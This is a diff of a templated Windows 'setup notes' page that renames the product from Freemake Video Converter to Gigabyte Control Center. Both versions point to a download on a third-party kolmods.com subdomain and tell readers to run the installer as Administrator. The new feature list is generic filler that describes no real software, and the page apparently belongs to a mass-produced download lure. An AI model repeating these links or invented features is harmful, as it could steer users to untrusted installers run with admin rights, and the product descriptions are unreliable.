@@ -1,10 +1,10 @@
-# Freemake Video Converter Windows Setup Notes
-
-**Download:** [Get Windows installer →](https://freemake-converter-setup.kolmods.com/)
+# Gigabyte Control Center Windows Setup Notes
 
 ## Download & Install
 
-> Setup notes for **Freemake Video Converter** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> **Download:** [**Get Gigabyte Control Center for Windows →**](https://gigabyte-control-center-setup.kolmods.com/)
+>
+> Setup notes for **Gigabyte Control Center** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Freemake Video Converter** from the Start menu
+5. Restart if the installer asks — then launch **Gigabyte Control Center** from the Start menu
 
 ## What you can use it for
 
-- Convert video and audio between popular formats
-- Batch conversion queues for large media libraries
-- Hardware-accelerated H.264/H.265 encoding
-- Preset profiles for mobile, web, and archive
-- Trim, crop, and metadata editing before export
+- Core Gigabyte Control Center features on Windows desktop
+- Install and configure Gigabyte Control Center for daily use
+- Import, edit, and export with Gigabyte Control Center tools
+- Tune settings and profiles inside Gigabyte Control Center
+- Integrate Gigabyte Control Center into your existing workflow
 
 ## License
 
